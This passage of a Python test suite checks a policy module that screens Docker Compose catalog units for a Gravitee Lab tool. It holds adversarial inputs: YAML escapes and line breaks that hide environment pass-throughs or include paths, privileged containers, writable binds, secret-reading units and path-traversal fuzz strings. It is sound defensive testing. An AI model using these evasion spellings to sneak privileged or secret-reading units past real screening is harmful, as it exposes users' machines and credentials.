                         {"T06": 4, "T18": 3, "T19": 2, "T26": 3})
        self.assertEqual(sorted(trust.RULES, key=lambda code: (code[0], int(code[1:]))),
                         [f"N0{n}" for n in range(1, 6)] + [f"T{n:02d}" for n in range(1, 30)])
        for code, rule in trust.RULES.items():
            self.assertIn(rule["class"], "PHN")
            self.assertEqual(rule["class"] == "H", code in {f"T{n:02d}" for n in range(3, 12)})
        self.assertEqual(trust.RULES["T21"]["lines"], ("Same name as {owner}",))
        self.assertEqual(trust.RULES["T28"]["lines"], ("Uses this machine without saying why: {service}",))

    def test_the_words_other_modules_use_are_the_words_of_the_notes(self):
        self.assertEqual((trust.SEED_OWN, trust.SEED_TOKEN), (line("N01"), line("N02")))
        self.assertEqual(trust.NOT_OFFERED, "Not offered by this catalog")
        self.assertEqual(line("T21", owner="Echo"), "Same name as Echo")
        self.assertEqual(line("T26", 1), "Written for an older Gravitee Lab")

    def test_no_line_says_a_machine_made_thing(self):
        for rule in trust.RULES.values():
            for text in rule["lines"]:
                self.assertNotRegex(text, r"\.lab|@|/|\u00b7|\u2022|\.\.\.|\u2026")
                self.assertFalse(text.endswith((".", "...")), text)

    def test_what_a_unit_reads_is_what_compose_would_read(self):
        text = "services:\n  a:\n    environment:\n      A: ${ONE}\n      B: ${TWO:-${THREE:-x}}\n      C: $FOUR\n      D: $${FIVE}\n"
        raw = {"services": {"a": {"environment": {"PASS": None, "EMPTY": "", "SET": "x"}}, "b": "no", "c": {"environment": None}}}
        self.assertEqual(trust.reads([text], raw), ["EMPTY", "FOUR", "ONE", "PASS", "THREE", "TWO"])
        self.assertEqual(trust.reads([], None), [])

    def read(self, text, **environment):
        """What `reads` says of a service whose environment `text` writes, given what compose.raw makes of it: the value of a
        name that is `None` for `NAME:` and a null, and "" for the list item `- NAME`, for `NAME=` and for `NAME: ""`."""
        return trust.reads([f"services:\n  a:\n    image: x\n    environment:\n{text}"],
                           {"services": {"a": {"environment": environment}}})

    def test_f1_a_list_item_with_no_value_reads_the_shell_whether_compose_says_none_or_empty(self):
        for value in (None, ""):
            with self.subTest(value=value):
                self.assertEqual(self.read("      - KEY\n", KEY=value), ["KEY"])
                self.assertEqual(self.read("      - 'KEY'\n      - \"OTHER\"  # why\n", KEY=value, OTHER=value), ["KEY", "OTHER"])
                self.assertEqual(self.read("      - KEY=\n      - BARE\n", KEY="", BARE=value), ["BARE"])

    def test_f1_a_name_given_an_empty_value_of_its_own_reads_nothing(self):
        """`KEY: ""` is the empty string and `- KEY=` is the same: Kafka disables a host name check that way, and the
        security providers of Gravitee are listed with an empty user. Neither asks the shell for anything."""
        text = ('      KEY: ""\n      "QUOTED": \'\'   # none\n      gravitee_security_providers_0_users_0_user: ""\n'
                '      - LISTED=\n      - "DOUBLE="\n')
        self.assertEqual(self.read(text, KEY="", QUOTED="", gravitee_security_providers_0_users_0_user="", LISTED="", DOUBLE=""), [])

    def test_f1_a_null_reads_the_shell_as_it_always_did(self):
        self.assertEqual(self.read("      KEY:\n      NULL: null\n      TILDE: ~\n", KEY=None, NULL=None, TILDE=None),
                         ["KEY", "NULL", "TILDE"])

    def test_f1_one_name_written_both_ways_reads(self):
        """Another service passes the name through, or the same file spells it as a flow list: a doubt counts as a read."""
        text = '      KEY: ""\n  b:\n    environment:\n      - KEY\n'
        self.assertEqual(self.read(text, KEY=""), ["KEY"])
        self.assertEqual(self.read('      KEY: ""\n    labels: [KEY]\n', KEY=""), ["KEY"])
        self.assertEqual(self.read('      KEY: ""\n    command: echo KEY\n', KEY=""), ["KEY"])
        self.assertEqual(self.read('      KEY: ""\n      KEY: ${SOMETHING}\n', KEY=""), ["KEY", "SOMETHING"])

    def test_f1_a_name_that_no_text_writes_reads(self):
        """An included unit's, or one the caller did not give a text for: only what a text says can clear it."""
        self.assertEqual(trust.reads([], {"services": {"a": {"environment": {"KEY": ""}}}}), ["KEY"])
        self.assertEqual(trust.reads(["services: {}\n"], {"services": {"a": {"environment": {"KEY": ""}}}}), ["KEY"])
        self.assertEqual(self.read('      OTHER: ""\n', KEY=""), ["KEY"])

    def test_f1_the_texts_of_the_files_merged_in_say_how_their_names_are_written(self):
        """A unit that includes another gets that unit's services in its configuration. Its explicit empty values are nobody's
        reads, and its ${NAME} are its own: they are judged with it and through the closure (T25), never read twice here."""
        mine = "include:\n  - ../b/compose.yml\nservices:\n  a:\n    image: x\n"
        theirs = "services:\n  b:\n    image: ${B_IMAGE:-x}\n    environment:\n      B_EMPTY: \"\"\n      - B_BARE\n"
        raw = {"services": {"b": {"environment": {"B_EMPTY": "", "B_BARE": ""}}}}
        self.assertEqual(trust.reads([mine], raw), ["B_BARE", "B_EMPTY"], "without its text")
        self.assertEqual(trust.reads([mine], raw, [theirs]), ["B_BARE"])
        self.assertEqual(trust.reads([mine], raw, []), ["B_BARE", "B_EMPTY"])

    def test_f1_a_spelling_that_hides_the_pass_through_is_read_as_what_it_spells(self):
        """`"NAM\\x45"` is NAME for Compose: an escape cannot be used to hide a bare item behind an explicit empty value."""
        for hidden in ('      - "NAM\\x45"\n', '      - "NA\\u004dE"\n', '      - "NA\\\n        ME"\n', "      - NAME # note\n",
                       "      - &anchor NAME\n", "      - !!str NAME\n"):
            with self.subTest(hidden=hidden):
                self.assertEqual(self.read('      NAME: ""\n' + hidden, NAME=""), ["NAME"])

    def test_f1_the_line_breaks_of_yaml_do_not_hide_the_pass_through_either(self):
        for brk in ("\r", "\u0085", "\u2028", "\u2029", "\r\n"):
            with self.subTest(brk=repr(brk)):
                self.assertEqual(self.read(f'      NAME: ""{brk}      - NAME{brk}', NAME=""), ["NAME"])
                self.assertEqual(self.read(f'      NAME: ""{brk}      OTHER: ""{brk}', NAME="", OTHER=""), [])

    def test_f1_what_an_explicit_empty_value_clears_is_one_line_one_name(self):
        for text in ('      KEY: "" # none\n', "      KEY:    ''\n", '      "KEY" : ""\n', "      - KEY=   \n", "      - 'KEY='\n",
                     "      - KEY= # note\n"):
            with self.subTest(text=text):
                self.assertEqual(self.read(text, KEY=""), [])
        for text in ('      KEY: "x"\n', "      KEY: ' '\n", "      - KEY=1\n", '      - KEY=""\n', "      - KEY =\n", "      - KEY=#note\n",
                     '      KEY: ""x\n', "      {KEY: \"\"}\n", "      ? KEY\n      : \"\"\n"):
            with self.subTest(text=text):
                self.assertEqual(self.read(text, KEY=""), ["KEY"])

    def test_what_a_seed_reads_is_what_the_seeder_replaces(self):
        text = "a: ${ONE}\nb: ${TWO:-default}\nc: $${THREE}\nd: $four\ne: {\"$ref\": \"#/x\"}\nf: ${5}\ng: ${SIX-x}\n"
        self.assertEqual(trust.seed_reads([text, "${ONE} ${SEVEN}"]), ["ONE", "SEVEN", "TWO"])
        self.assertEqual(trust.seed_reads([]), [])

    def test_f2_the_names_the_seeder_gives_a_file_are_no_setting_of_this_machine(self):
        text = "id: ${ENV_ID}\nname: ${ENV_NAME:-x}\nnote: $${ENV_ID}\nother: ${ENV_IDENTITY}\nsetting: ${ELSEWHERE}\n"
        self.assertEqual(trust.seed_reads([text]), ["ELSEWHERE", "ENV_IDENTITY"])
        self.assertEqual(trust.reads([text]), ["ELSEWHERE", "ENV_ID", "ENV_IDENTITY", "ENV_NAME"],
                         "a compose file gets no value from the seeder: its ${ENV_ID} is read from the shell")

    def test_f2_the_provided_names_are_the_ones_the_seeder_provides(self):
        """seeder/lab_seeder/common.py cannot be imported here (it needs requests and yaml, the Lab UI's tests need nothing), so its
        assignment is read as the syntax it is."""
        import ast
        source = (regen.ENGINE / "seeder" / "lab_seeder" / "common.py").read_text(encoding="utf-8")
        assigned = [node.value for node in ast.parse(source).body
                    if isinstance(node, ast.Assign) and [target.id for target in node.targets if isinstance(target, ast.Name)] == ["PROVIDED"]]
        self.assertEqual(len(assigned), 1, "common.py assigns PROVIDED once")
        self.assertEqual(trust.PROVIDED, ast.literal_eval(assigned[0]))

    def test_unescaped_is_the_text_as_the_screen_reads_its_letters(self):
        for text, wanted in (('"env_\\x66ile"', '"env_file"'), ('"env_\\u0066ile"', '"env_file"'), ('"env_\\U00000066ile"', '"env_file"'),
                             ('"env_\\\n   file"', '"env_file"'), ("a\r\nb\rc\u0085d\u2028e\u2029f", "a\nb\nc\nd\ne\nf"),
                             ('"\\xZZ"', '"\\xZZ"'), ('"\\U00110000"', '" "'), ("plain", "plain")):
            with self.subTest(text=text):
                self.assertEqual(trust.unescaped(text), wanted)
        self.assertFalse(hasattr(trust, "_unescaped"), "one public name")

    def test_the_roots_are_real_paths(self):
        folder = Path(tempfile.mkdtemp()).resolve()
        (folder / "real").mkdir()
        os.symlink(folder / "real", folder / "link")
        roots = trust.build_roots(folder / "link", folder / "link" / "unit", [folder / "link" / "sibling"], ("apim",))
        self.assertEqual(roots["unit"], f"{folder}/real/unit")
        self.assertEqual((roots["state"], roots["secrets"]), (f"{folder}/real/unit/.state", f"{folder}/real/unit/secrets"))
        self.assertEqual(roots["closure"], [f"{folder}/real/sibling"])
        self.assertEqual(roots["plugins"], [f"{folder}/real/plugins/apim"])
        self.assertEqual(roots["seeder"], f"{folder}/real/seeder")
        self.assertEqual(roots["machine"], [f"{folder}/real/{name}" for name in trust.MACHINE_FILES])
        self.assertIsNone(trust.build_roots(folder, None)["unit"])
        self.assertEqual(trust.build_roots(folder, None, machine=[])["machine"], [])


class Verdicts(Golden):

    def test_what_an_author_wrote_is_cut_in_every_line(self):
        """The reasons go into the state the page polls: a name of 100000 characters is one line of a few, never a megabyte."""
        long = "x" * 100000

        def edit(arguments):
            services = arguments["unit_config"]["services"]
            services["hostile-clean"].update({long: 1, "volumes": [{"type": "bind", "source": arguments["roots"]["unit"] + "/x", "target": "/x"}]})
            arguments["unit_config"]["services"]["apim-gateway"] = {"labels": {"io.gravitee.name": long}, "ports": ["80:80"]}
            arguments["unit_config"]["x-" + long] = 1
            arguments["unit_config"][long] = 1
            arguments["overlaid"] = {"apim-gateway": {"ports": ["80:80"]}}
            arguments["unit"]["references"] = [long, long + "y", "OTHER_" + long]
            arguments["unit"]["name"] = long
            arguments["own"] = ["hostile-clean", long]
            services[long] = {"image": "busybox", "privileged": True}
        verdict = self.changed(CLEAN, edit, listed=True)
        self.assertTrue(verdict["reasons"])
        self.assertLess(max(len(reason) for reason in verdict["reasons"]), 300, verdict["reasons"])
        self.assertLessEqual(len(verdict["name"]), 80)
        surface = verdict["surface"]
        self.assertLessEqual(len(surface["core"][0]["label"]), 80)
        self.assertLessEqual(max(len(label) for entry in surface["uses_machine"] for label in (entry["label"], entry["why"])), 200)
        for code in ("T01", "T02", "T20", "T22", "T28"):
            self.assertIn(code, verdict["codes"], verdict["reasons"])
        def many(arguments):
            arguments["unit"]["references"] = [long + str(number) for number in range(5)]
        again = self.changed(CLEAN, many)
        self.assertTrue(again["reasons"][-1].endswith("and 2 more"), again["reasons"])   # the count of the rest is never the part that is cut

    def test_what_the_preview_shows_of_an_image_a_build_and_a_setting_is_cut(self):
        long = "z" * 100000

        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["image"] = long + ":1"
            del arguments["unit_config"]["services"]["hostile-clean"]["build"]
            arguments["unit"]["references"] = [long]
        self.assertLessEqual(max(len(image) for image in self.changed(CLEAN, edit, ns="z" * 3)["surface"]["images"]), 120)
        def build(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": "github.com/" + long + ".git#" + "a" * 40}
        self.assertLessEqual(len(self.changed(CLEAN, build)["surface"]["builds"][0]["source"]), 120)
        def read(arguments):
            arguments["unit"]["references"] = ["HOSTILE_" + long]
            arguments["env"] = {"HOSTILE_" + long}
        self.assertLessEqual(len(self.changed(CLEAN, read)["surface"]["reads"][0]), 80)

    def test_the_words_a_caller_puts_in_a_line_are_cut_too(self):
        long = "y" * 100000
        self.assertLess(len(line("T21", owner=long)), 300)
        self.assertEqual(line("T21", owner="  Echo\n\x00 two "), "Same name as Echo two")
        combined = trust.combine([self.judge(CLEAN), dict(self.judge("t03-privileged"), name=long)])
        self.assertLess(max(len(reason) for reason in combined["reasons"]), 300)
        self.assertLess(len(trust.add_reason(combined, "T21", line("T21", owner=long))["reasons"][-1]), 300)
        self.assertEqual(line("T26", 0), "Needs a newer Gravitee Lab")

    def test_a_namespace_that_is_a_prefix_of_what_the_person_keeps_is_shown_when_it_is_set(self):
        """T20 passes a name that starts with the namespace of the catalog, so a catalog called like a tool the person keeps a
        key for (openai, gemini) reads it with no reason: the preview names what is really set."""
        def edit(arguments):
            arguments["unit"]["references"] = ["HOSTILE_API_KEY", "HOSTILE_UNSET", "INTERNAL_API_PASSWORD"]
            arguments["env"] = {"HOSTILE_API_KEY", "INTERNAL_API_PASSWORD", "OTHER_SET"}
        shown = self.changed(CLEAN, edit)
        self.assertEqual(shown["state"], "ok")
        self.assertEqual(shown["surface"]["reads"], ["HOSTILE_API_KEY"])
        self.assertEqual(self.changed(CLEAN, edit, listed=True)["surface"]["reads"], [])
        self.assertEqual(self.changed(CLEAN, edit, ns="fixture")["surface"]["reads"], [])

    def test_a_verdict_has_the_shape_of_section_8_4(self):
        verdict = self.judge("t03-privileged")
        self.assertEqual(sorted(verdict), ["codes", "name", "notes", "reasons", "state", "surface"])
        self.assertEqual(sorted(verdict["surface"]), sorted(trust.empty_surface()))

    def test_reasons_come_in_the_order_of_the_rules_one_line_each(self):
        def edit(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean"]
            service.update(frobnicate=1, volumes=[{"type": "bind", "source": arguments["roots"]["unit"] + "/x", "target": "/x"}],
                           ports=[{"target": 1}])
            arguments["unit"]["references"] = ["HOME"]
        verdict = self.changed(CLEAN, edit)
        self.assertEqual(verdict["codes"], ["T01", "T12", "T17", "T20"])
        self.assertEqual(verdict["reasons"], [line("T01", key="frobnicate"), line("T12"), line("T17"), line("T20", names="HOME")])

    def test_a_line_two_rules_share_is_said_once(self):
        def edit(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean"]
            service["volumes_from"] = ["mongodb"]
            service["volumes"] = [{"type": "volume", "source": "data-mongo", "target": "/x"}]
        verdict = self.changed(CLEAN, edit)
        self.assertEqual(verdict["codes"], ["T01", "T13", "T14"])
        self.assertEqual(verdict["reasons"].count(line("T13")), 1)

    def test_add_reason_blocks_and_does_not_repeat(self):
        verdict = self.judge(CLEAN)
        one = trust.add_reason(verdict, "T21", "Same name as Echo")
        self.assertEqual((one["state"], one["reasons"], one["codes"]), ("blocked", ["Same name as Echo"], ["T21"]))
        two = trust.add_reason(one, "T21", "Same name as Echo")
        self.assertEqual(two, one)
        self.assertEqual(verdict["state"], "ok")

    def test_combine_the_worst_of_a_closure(self):
        good, bad = self.judge(CLEAN), self.judge("t12-bind-writable")
        self.assertEqual(trust.combine([good, good])["state"], "ok")
        both = trust.combine([good, bad, bad])
        self.assertEqual(both["reasons"], [line("T25", name="Writable bind")])
        own = trust.combine([bad, good])
        self.assertEqual(own["reasons"], [line("T12")])
        self.assertEqual(trust.combine([])["state"], "ok")
        self.assertEqual(trust.combine([None, good])["state"], "ok")
        notes = trust.combine([self.judge("n03-external-console"), self.judge("n05-foreign-terminal")])
        self.assertEqual(notes["notes"], [line("N03")])
        self.assertEqual(trust.combine([good, dict(bad, name="")])["reasons"], [line("T25", name="a unit")])

    def test_a_unit_that_is_blocked_by_its_own_reasons_and_its_closure_says_both(self):
        verdict = trust.combine([self.judge("t12-bind-writable"), self.judge("t12-bind-writable")])
        self.assertEqual(verdict["reasons"], [line("T12"), line("T25", name="Writable bind")])

    def test_a_unit_of_this_machine_is_never_blocked_by_the_policy(self):
        for name in ("t03-privileged", "t12-bind-writable", "t17-all-interfaces", "t22-overlay-too-much", "t11-bind-lab-state"):
            verdict = self.judge(name, local=True)
            with self.subTest(unit=name):
                self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))
        self.assertEqual(self.judge("t03-privileged", local=True)["surface"]["uses_machine"][0]["what"], ["runs privileged"])

    def test_a_screened_unit_is_blocked_with_the_reasons_of_the_screen_alone(self):
        arguments = self.args("t12-bind-writable", screened=[line("T19", 0)])
        verdict = trust.judge(**arguments)
        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", [line("T19", 0)], ["T19"]))

    def test_a_unit_that_compose_could_not_read_is_judged_on_what_is_known(self):
        verdict = self.judge("t23-include-outside")
        self.assertEqual(verdict["codes"], ["T23", "T27"])
        self.assertEqual(verdict["notes"], [])

    def test_the_default_context_is_the_narrowest(self):
        arguments = self.args("h-privileged-declared")
        arguments["context"] = {}
        self.assertEqual(trust.judge(**arguments)["reasons"], [line("T03")])
        arguments = self.args(PLAYGROUND)
        arguments["context"] = {}
        arguments["roots"] = {}
        self.assertEqual(trust.judge(**arguments)["state"], "blocked")


class Hostile(Golden):
    """Input made to break the policy: it blocks one unit and never raises."""

    def test_judge_never_raises_on_what_it_cannot_read(self):
        weird = [None, 0, 1.5, "x", [], {}, [None], {"services": None}, {"services": []}, {"services": {"a": None}},
                 {"services": {"a": {"volumes": "x", "ports": 3, "networks": 4, "build": [], "labels": "x", "environment": []}}},
                 {"services": {"a": {"volumes": [None, 7, ["x"], {"type": None, "source": ["x"]}], "ports": [None, 1, [], {"host_ip": []}]}}},
                 {"volumes": 3, "networks": [], "secrets": "x", "configs": None, "name": []}, {"x" * 10: float("nan")}]
        roots = [None, {}, {"unit": 5, "plugins": "x", "closure": [None, 3]}, {"unit": "", "seeder": []}]
        contexts = [None, {}, {"realpath": 5, "ns": 3, "requires": "x", "shared_settings": 7, "level": "x"}, {"home": 4, "closure_names": [None]}]
        units = [None, {}, {"kind": 4, "meta": []}, {"meta": {"host_access": 5, "terminal": [1], "gateway": []}, "includes": 5,
                                                      "references": [1, None], "seed_references": "x"}]
        count = 0
        for config in weird:
            for own, overlaid in (([], {}), (["a"], {"a": None}), ("a", []), (["a", 1], {"a": [3], "b": 4})):
                for unit in units:
                    verdict = trust.judge(unit, config, config, own, overlaid, roots[count % 4], {1, "a"}, contexts[count % 4])
                    self.assertIn(verdict["state"], ("ok", "blocked"))
                    count += 1
        self.assertGreater(count, 100)

    ODD = (None, 0, 1, -1, 1.5, True, False, "", "x", "host", "/", "../x", [], [None], [1, "a"], {}, {"a": None}, {"host_ip": None},
           {"type": "bind"}, {"source": "/x", "type": "bind"}, ["a:b:c"], "a:b", float("inf"), "service:", "service:x", "\0",
           "a" * 3000)

    def mutate(self, node, chance):
        """One change in a JSON: a value made odd, a key dropped or added."""
        if isinstance(node, dict) and node:
            key = chance.choice(list(node))
            kind = chance.random()
            if kind < 0.3:
                node[key] = chance.choice(self.ODD)
            elif kind < 0.4:
                del node[key]
            elif kind < 0.5:
                node[chance.choice(("x", "privileged", "ports", "volumes", "build", "networks", "environment", "network_mode",
                                    "pid", "labels", "security_opt", "deploy", "image"))] = chance.choice(self.ODD)
            else:
                self.mutate(node[key], chance)
        elif isinstance(node, list) and node:
            index = chance.randrange(len(node))
            if chance.random() < 0.4:
                node[index] = chance.choice(self.ODD)
            else:
                self.mutate(node[index], chance)

    def test_an_input_made_odd_never_reaches_the_safety_net(self):
        """judge catches what it did not foresee and blocks the unit; this holds that it foresees the values a JSON can hold."""
        chance = random.Random(7)
        names = [name for name in regen.names() if not regen.load(name).get("never_compose")]
        cases = {name: self.args(name, realpath=None) for name in names}
        for number in range(600):
            name = chance.choice(names)
            arguments = copy.deepcopy(cases[name])
            part = chance.choice(("unit_config", "overlaid", "context", "unit", "roots", "core_config", "own"))
            for _ in range(chance.randint(1, 3)):
                self.mutate(arguments[part], chance)
            verdict = trust.judge(**arguments)
            self.assertFalse([reason for reason in verdict["reasons"] if "unexpected" in reason], (name, part, number))

    def test_the_screen_never_raises_on_what_looks_like_a_file(self):
        chance = random.Random(11)
        pieces = ("include:", "env_file:", "extends:", "file:", "  - ", "- ", "[", "]", "{", "}", ",", '"', "'", "\\", "\n", "\n  ",
                  "#", " # ", "&a ", "*a", "!!str ", "? ", ": ", "/dev/zero", "../x", "~/y", "${H}", "\\x66", "\\u0066", "env_", "a",
                  "services:", "  ", "\t", "\r\n", "\x00", "|", ">")
        for _ in range(1500):
            text = "".join(chance.choice(pieces) for _ in range(chance.randint(1, 40)))
            self.assertIsInstance(trust.prescreen(text, ".lab/catalogs/ns/addons/x/compose.yml"), list)

    def test_the_other_functions_are_as_tolerant(self):
        for value in (None, 0, "x", [], {}, [None], {"a": None}, {"services": {"a": 1}}):
            trust.surface(value, value, [value], value, value, value)
            trust.elevations(value)
            trust.overlays(value, set(), [value])
            trust.combine([value])
            trust.sum_surfaces([trust.empty_surface()])
            trust.seeder_ok(value, value, [value])
            trust.terminal_ok(value, [value], {value} if isinstance(value, (str, type(None), int)) else set())

    def test_a_hostile_unit_cannot_pass_by_a_value_that_looks_like_a_false(self):
        for value in ("false", "0", 0, None, False, ""):
            def edit(arguments, value=value):
                arguments["unit_config"]["services"]["hostile-clean"]["privileged"] = value
            with self.subTest(value=value):
                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
        for value in (True, "true", "True", "yes", "1", "on", " TRUE "):
            def edit(arguments, value=value):
                arguments["unit_config"]["services"]["hostile-clean"]["privileged"] = value
            with self.subTest(value=value):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T03")])

    def test_a_declaration_cannot_be_forged_through_the_unit_dict_of_another_service(self):
        def edit(arguments):
            arguments["unit"]["meta"]["host_access"] = {"hostile-privileged": "yes", "hostile-clean": "x" * 10}
            arguments["own"] = ["hostile-privileged"]
        self.assertEqual(self.changed("t03-privileged", edit, listed=True)["state"], "ok")
        def two(arguments):
            arguments["unit"]["meta"]["host_access"] = {"hostile-clean": "why"}
        self.assertEqual(self.changed("t03-privileged", two, listed=True)["codes"], ["T28"])


class Touched(BaseException):
    """Not an Exception: the safety net of judge would swallow one."""


class Forbidden(dict):
    """An environment that nobody may read."""

    def __getitem__(self, key):
        raise Touched(key)

    get = __contains__ = keys = items = __getitem__


class Pure(Golden):
    """judge reads no file, runs no command, opens no connection, and changes nothing it is handed."""

    PATCHED = ((builtins, "open"), (io, "open"), (os, "stat"), (os, "lstat"), (os, "listdir"), (os, "scandir"), (os, "readlink"),
               (os, "getcwd"), (os, "system"), (os, "walk"), (os.path, "realpath"), (os.path, "exists"), (os.path, "isfile"),
               (os.path, "isdir"), (os.path, "islink"), (os.path, "abspath"), (pathlib.Path, "stat"), (pathlib.Path, "exists"),
               (pathlib.Path, "read_text"), (pathlib.Path, "resolve"), (pathlib.Path, "open"), (pathlib.Path, "iterdir"),
               (subprocess, "run"), (subprocess, "Popen"), (subprocess, "check_output"), (socket, "socket"),
               (socket, "create_connection"), (socket, "getaddrinfo"), (time, "sleep"), (compose, "run"))

    def untouched(self):
        """A context in which every way to touch the world raises Touched."""
        def touch(*args, **how):
            raise Touched(f"touched the world: {args}")
        stack = ExitStack()
        for target, name in self.PATCHED:
            stack.enter_context(mock.patch.object(target, name, touch))
        stack.enter_context(mock.patch.object(os, "environ", Forbidden()))
        return stack

    def test_judge_touches_nothing_on_any_golden(self):
        cases = {name: self.args(name, listed=name != "t03-privileged", realpath=None) for name in regen.names()
                 if not regen.load(name).get("never_compose")}
        before = {name: trust.judge(**copy.deepcopy(arguments)) for name, arguments in cases.items()}
        resolve.target_of("x")   # the module is loaded before the world is taken away
        with self.untouched():
            after = {name: trust.judge(**arguments) for name, arguments in cases.items()}
            for name, arguments in cases.items():
                trust.surface(arguments["unit_config"], arguments["core_config"], arguments["own"], arguments["overlaid"],
                              arguments["roots"], dict(arguments["context"], unit=arguments["unit"]))
        self.assertEqual(after, before)
        self.assertGreater(len(after), 40)

    def test_the_other_pure_functions_touch_nothing_either(self):
        arguments = self.args(PLAYGROUND, realpath=None)
        with self.untouched():
            trust.prescreen("include:\n  - ../a.yml\n", ".lab/catalogs/ns/addons/x/compose.yml")
            trust.prescreen("services:\n  a:\n    env_file: [a.env, \"b.env\"]\n", ".lab/catalogs/ns/addons/x/compose.yml", follow=True)
            trust.env_files("services:\n  a:\n    env_file: a.env\n", ".lab/catalogs/ns/addons/x/compose.yml")
            trust.reads(["A=${B}"], {"services": {"a": {"environment": {"C": None}}}})
            resolve.shown("a name", 3)
            resolve.owned_names(arguments["unit_config"], arguments["core_config"], arguments["own"])
            trust.elevations({"privileged": True, "volumes": [{"type": "bind", "source": "/x"}]}, arguments["roots"])
            trust.overlays({"services": {"a": {"environment": {"A": "1"}}}}, {"a"})
            trust.local_address("http://localhost")
            trust.combine([trust.empty_surface() and {"state": "ok", "reasons": [], "notes": [], "surface": trust.empty_surface()}])
            trust.seed_reads(["${A}"])
            trust.seeder_ok(arguments["unit_config"], arguments["roots"], [])
            trust.terminal_ok({}, [], set())
            trust.declared_ok({})
            resolve.collisions([], {}, {})
            resolve.closure({}, "addon", "x")
            resolve.catalog_needs({"ns": "a", "includes": []}, {}, [])

    def test_judge_with_the_audiences_of_a_caller_touches_nothing_either(self):
        arguments = self.args(CLEAN, realpath=None, audience="public", closure_audiences=["private", "public"])
        before = trust.judge(**copy.deepcopy(arguments))
        resolve.rank("x")
        with self.untouched():
            after = trust.judge(**arguments)
        self.assertEqual(after, before)
        self.assertEqual(after["codes"], ["T24"])

    def test_judge_leaves_what_it_is_handed_as_it_was(self):
        for name in regen.names():
            if regen.load(name).get("never_compose"):
                continue
            arguments = self.args(name, listed=True)
            before = copy.deepcopy(arguments)
            trust.judge(**arguments)
            with self.subTest(unit=name):
                self.assertEqual(arguments, before)

    def test_judge_is_deterministic(self):
        for name in ("t03-privileged", CLEAN, PLAYGROUND, "t20-foreign-setting"):
            arguments = self.args(name)
            self.assertEqual(trust.judge(**arguments), trust.judge(**arguments))

    def test_the_paths_are_resolved_through_the_one_function_it_is_given(self):
        seen = []
        def resolver(path):
            seen.append(path)
            return path
        arguments = self.args("h-sibling-bind-ro", realpath=resolver)
        seen.clear()
        trust.judge(**arguments)
        self.assertTrue(seen)
        self.assertTrue(all(isinstance(path, str) and path.startswith("/") for path in seen))
        self.assertTrue(any(path.endswith("/secrets") for path in seen))

    def test_a_resolver_that_fails_is_a_path_as_written(self):
        def broken(path):
            raise OSError("no")
        def edit(arguments):
            arguments["context"]["realpath"] = broken
        self.assertEqual(self.changed("h-sibling-bind-ro", edit)["state"], "ok")

    def test_the_module_imports_nothing_that_reads_the_world(self):
        source = Path(trust.__file__).read_text(encoding="utf-8")
        for module in ("subprocess", "socket", "urllib", "tempfile", "shutil", "datetime", "time", "json"):
            self.assertNotRegex(source, rf"^\s*(import|from) {module}\b", module)


@unittest.skipUnless(fixtures.have_compose(), "the Docker CLI with Compose 5 or later is not installed")
class Differential(Case):
    """include_targets against the Compose that reads the same text. The walk of a closure follows the files it names, so a file
    that Compose opens and it does not name is a file nobody screened: for each text, the file Compose opens is among them or
    the answer is None. (Compose renders the files; no daemon.)"""

    FOLDER = "x"
    # (what the text spells, the text, the file Compose opens, whether include_targets must answer: True a list, False None)
    ROWS = (
        ("plain list", "include:\n  - b.yml\n", "b.yml", True),
        ("flow list", "include: [b.yml, c.yml]\n", "b.yml", True),
        ("path", "include:\n  - path: b.yml\n", "b.yml", True),
        ("path list", "include:\n  - path:\n      - b.yml\n      - c.yml\n", "b.yml", True),
        ("flow map", "include:\n  - {path: b.yml}\n", "b.yml", True),
        ("double quotes", 'include:\n  - "b.yml"\n', "b.yml", True),
        ("single quotes", "include:\n  - 'b.yml'\n", "b.yml", True),
        ("comment", "include:  # needs b\n  - b.yml   # why\n\n  # nothing\n  - c.yml\n", "b.yml", True),
        ("list at the key's column", "include:\n- b.yml\n", "b.yml", True),
        ("anchor", "include: &l\n  - b.yml\n", "b.yml", True),
        ("tag", "include:\n  - !!str b.yml\n", "b.yml", True),
        ("carriage returns", "include:\r\n  - b.yml\r\n", "b.yml", True),
        ("path up and down", "include:\n  - ./sub/../b.yml\n", "b.yml", True),
        ("a quoted key", "'include':\n  - b.yml\n", "b.yml", True),
        ("a quoted key in double quotes", '"include":\n  - b.yml\n', "b.yml", True),
        ("a key with properties", "&top include: [b.yml]\n", "b.yml", True),
        ("a flow document", "{\n  include: [b.yml],\n  services: {}\n}\n", "b.yml", None),
        ("a key after a mapping", "x: 1\ninclude:\n  - b.yml\nz: 2\n", "b.yml", True),
        ("a mark at the start", "\ufeffinclude:\n- b.yml\n", "b.yml", True),
        ("prose is no key", "x-note: \"does not include: b.yml\"\nx-b: 'include: b.yml'\n", None, True),
        ("a fold in a command", "services:\n  a:\n    image: q\n    command: |\n      echo a \\\n        b\ninclude:\n  - b.yml\n", "b.yml", True),
        # the spellings that read another name than their letters (the review): none of them is named by letters
        ("single quotes keep an escape", "include:\n  - 'b\\x41.yml'\n", "b\\x41.yml", False),
        ("a plain scalar keeps an escape", "include:\n  - b\\x41.yml\n", "b\\x41.yml", False),
        ("double quotes keep an escaped backslash", 'include:\n  - "b\\\\x41.yml"\n', "b\\x41.yml", False),
        ("double quotes replace an escape", 'include:\n  - "b\\x41.yml"\n', "bA.yml", False),
        ("double quotes join a fold", 'include:\n  - "b\\\n    .yml"\n', "b.yml", False),
        ("a space at the end", 'include:\n  - "b.yml "\n', "b.yml ", False),
        ("a space at the end in single quotes", "include:\n  - 'b.yml '\n", "b.yml ", False),
        ("a space at the start", 'include:\n  - " b.yml"\n', " b.yml", False),
        ("a space at the end in a flow list", 'include: ["b.yml "]\n', "b.yml ", False),
        ("a plain scalar on two lines", "include:\n  - b\n    .yml\n", "b .yml", False),
        ("a plain scalar on two lines, further in", "include:\n  - b\n     .yml\n", "b .yml", False),
        ("a plain scalar on two lines in a flow list", "include: [b\n  .yml]\n", "b .yml", False),
        ("a colon and a comma", "include:\n  - :,\n", ":,", False),
        ("a colon and a comma after path", "include:\n  - path: :,\n", ":,", False),
